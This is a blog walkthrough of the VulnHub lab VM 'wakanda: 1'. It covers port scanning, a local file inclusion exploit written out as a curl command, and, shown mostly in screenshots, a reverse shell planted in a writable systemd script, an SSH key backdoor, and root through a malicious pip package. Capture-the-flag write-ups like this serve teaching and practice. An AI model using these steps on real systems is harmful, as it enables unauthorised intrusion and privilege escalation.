---
layout: post
date: 2018-08-29 18:39:02 +0000
title: "wakanda: 1 Walkthrough"
subtitle: "Wakanda Forever"
category: Walkthrough
tags: [VulnHub, wakanda]
comments: true
image:
  feature: wakanda-1-walkthrough.jpg
  credit: RoDobby / Pixabay
  creditlink: https://pixabay.com/en/africa-kenya-landscape-nature-283868/
---

This post documents the complete walkthrough of wakanda: 1, a boot2root [VM][1] created by [@xMagass][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          57594/tcp  status
|_  100024  1          58513/udp  status
3333/tcp  open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
57594/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```

`nmap` finds `80/tcp`, `111/tcp` and `3333/tcp` open. Nothing stands out, except for SSH running at `3333/tcp`.

Let's check out the "Vibranium Market" home page.

![886afd6f.png](/assets/images/posts/wakanda-1-walkthrough/886afd6f.png)

### Local File Inclusion (LFI)

Let's check the HTML source as well while we are at it.

![c430062f.png](/assets/images/posts/wakanda-1-walkthrough/c430062f.png)

The commented HTML seems to suggest LFI vulnerability is present with the `lang` parameter.

![eca56f17.png](/assets/images/posts/wakanda-1-walkthrough/eca56f17.png)

Hmm. The message changes to French.

```
# curl -I 192.168.30.129/fr.php
HTTP/1.1 200 OK
Date: Tue, 28 Aug 2018 16:38:35 GMT
Server: Apache/2.4.10 (Debian)
Content-Type: text/html; charset=UTF-8
```

The file `fr.php` is also present.

I'm guessing there's PHP code in `index.php` like this.

```php
include( $_GET['lang']) . ".php" );
```

In that case, we can make use of PHP filter wrapper to peek at `index.php` in `base64` encoding.

![1cf6a5ba.png](/assets/images/posts/wakanda-1-walkthrough/1cf6a5ba.png)

Indeed, let's clean it up with some Linux-fu.

```
# curl -s http://192.168.30.129/index.php?lang=php://filter/convert.base64-encode/resource=index | head -1 | base64 -d | sed -r '/^$/d'
```

Here's the output.

```php
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it
if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">
    <title>Vibranium Market</title>
    <link href="bootstrap.css" rel="stylesheet">

    <link href="cover.css" rel="stylesheet">
  </head>
  <body class="text-center">
    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>
      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
          <?php
            if (isset($_GET['lang']))
          {
          echo $message;
          }
          else
          {
            ?>
            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
            <?php
          }
?>
        </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>
      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>

</body></html>
```

:smirk: The password `Niamey4Ever227!!!` at the top is most probably `mamaodou`'s password.

### Low-Privilege Shell

Let's give it a shot.

![337f77f3.png](/assets/images/posts/wakanda-1-walkthrough/337f77f3.png)

Who uses a Python interpreter as shell? No big deal–we can give ourselves a shell like so.

![17e61202.png](/assets/images/posts/wakanda-1-walkthrough/17e61202.png)

### DevOps Trickery in `systemd`

During enumeration of `mamadou`'s account, I found the following:

+ A Python file `/srv/.antivirus.py` containing a one-liner
+ A `systemd` service—Antivirus that executes the above with `devops` account

Here's how `/srv/.antivirus.py` looks like.

![c0c4eee5.png](/assets/images/posts/wakanda-1-walkthrough/c0c4eee5.png)

The important thing about `/srv/.antivirus.py` is that anyone can edit it.

![963f0c47.png](/assets/images/posts/wakanda-1-walkthrough/ef3085a9.png)

Here's how `/lib/systemd/system/antivius.service` looks like.

![529acb4c.png](/assets/images/posts/wakanda-1-walkthrough/529acb4c.png)

`systemd` will attempt to restart the service every 300 seconds in the event it fails to start.

If we change `/src/.antivirus.py` to something like this, we get a reverse shell via `nc` (which is available in the VM by the way) with `devops` privileges 300 seconds later.

![4d3bb1e4.png](/assets/images/posts/wakanda-1-walkthrough/4d3bb1e4.png)

While we wait for our reverse shell, the first flag is at `mamadou`'s home directory.

![f5d2d153.png](/assets/images/posts/wakanda-1-walkthrough/f5d2d153.png)

In the meantime, I think I found the ticket to privilege escalation.

![7a7ccc8f.png](/assets/images/posts/wakanda-1-walkthrough/7a7ccc8f.png)

300 seconds have passed, and I got myself a reverse shell.

![be072629.png](/assets/images/posts/wakanda-1-walkthrough/be072629.png)

Since SSH is available, let's put in the SSH public key we control to `/home/devops/.ssh/authorized_keys` and log in through SSH. This way, we get a far superior shell.

Generate the keypair with `ssh-keygen` at the attacking machine.

![003707ee.png](/assets/images/posts/wakanda-1-walkthrough/003707ee.png)

Create the `/home/devops/.ssh` directory and copy the public key over at the less superior shell. :laughing:

![41e67686.png](/assets/images/posts/wakanda-1-walkthrough/41e67686.png)

Now, log in to `devops`'s account with the private key.

![7270307d.png](/assets/images/posts/wakanda-1-walkthrough/7270307d.png)

Before we move on, here's the second flag.

![e93de75a.png](/assets/images/posts/wakanda-1-walkthrough/e93de75a.png)

### Privilege Escalation

We know `pip` is for installing Python packages. Does that mean that we have to write our own privilege escalation package?

![980c4145.png](/assets/images/posts/wakanda-1-walkthrough/980c4145.png)

Let's do something like this.

![5888ea6e.png](/assets/images/posts/wakanda-1-walkthrough/5888ea6e.png)

 On the `nc` listener, a `root` shell returns.

 ![f340b5a8.png](/assets/images/posts/wakanda-1-walkthrough/f340b5a8.png)

### What's the Flag (WTF)

After repeating the SSH trick for `root`, getting the flag is trivial.

![738ee9e4.png](/assets/images/posts/wakanda-1-walkthrough/738ee9e4.png)

:dancer:

### Afterthought

Where's the Vibranium?

[1]: https://www.vulnhub.com/entry/wakanda-1,251/
[2]: https://twitter.com/@xMagass
[3]: https://www.vulnhub.com/
